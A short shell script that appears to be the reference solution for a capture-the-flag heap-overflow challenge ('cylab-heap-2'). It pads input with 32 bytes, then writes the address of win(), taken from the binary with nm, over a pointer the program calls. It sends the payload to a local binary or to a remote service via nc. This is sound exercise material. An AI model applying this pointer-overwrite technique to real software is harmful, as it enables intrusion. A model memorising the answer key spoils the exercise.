#!/bin/sh
# Reference solution (shell form) for cylab-heap-2.
# Overflow input_data (32 filler bytes) so the following bytes land on the
# buffer x points to, then set them to the address of win(). check_win()
# reads a 4-byte int out of x and calls it, so pointing it at win() prints
# the flag.
#
# The binary is not a PIE, so win() lives at a fixed address -- read it out
# of the binary with nm. check_win() reads 4 bytes and scanf() writes the
# terminating NUL, which supplies win()'s high zero byte, so we only emit
# the low three bytes, little-endian, as octal escapes for printf '%b'.
#
# Usage:
#   ./solve.sh               solve a local ./chall  (needs ./chall and ./flag.txt here)
#   ./solve.sh HOST PORT     solve a deployed service over the network, via nc

WIN=0x$(nm ./chall | awk '$3=="win"{print $1}')
ADDR=$(printf '\\0%o\\0%o\\0%o' $((WIN & 255)) $((WIN/256 & 255)) $((WIN/65536 & 255)))
PAD=$(printf 'A%.0s' $(seq 1 32))
PAYLOAD="2\n${PAD}${ADDR}\n4\n"

if [ "$#" -ge 2 ]; then
	printf '%b' "$PAYLOAD" | nc "$1" "$2"
else
	printf '%b' "$PAYLOAD" | ./chall
fi
